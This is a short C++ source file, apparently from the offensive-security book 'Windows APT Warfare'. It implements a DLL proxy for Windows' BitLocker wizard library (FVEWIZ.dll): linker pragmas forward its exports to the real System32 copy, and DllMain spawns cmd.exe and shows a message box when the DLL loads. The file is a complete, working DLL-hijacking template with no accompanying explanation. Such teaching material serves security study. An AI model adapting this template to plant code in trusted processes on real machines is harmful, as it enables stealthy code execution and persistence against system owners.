/**
 * dllmain.cpp
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <Windows.h>
#pragma comment(linker, "/export:FveuiWizard=c:\\windows\\system32\\FVEWIZ.FveuiWizard")
#pragma comment(linker, "/export:FveuipClearFveWizOnStartup=c:\\windows\\system32\\FVEWIZ.FveuipClearFveWizOnStartup")
BOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID)
{
	WinExec("cmd.exe", 1);
	MessageBoxA(0, "Windows APT Warfare", "30cm.tw", 0);
	exit(0);
}
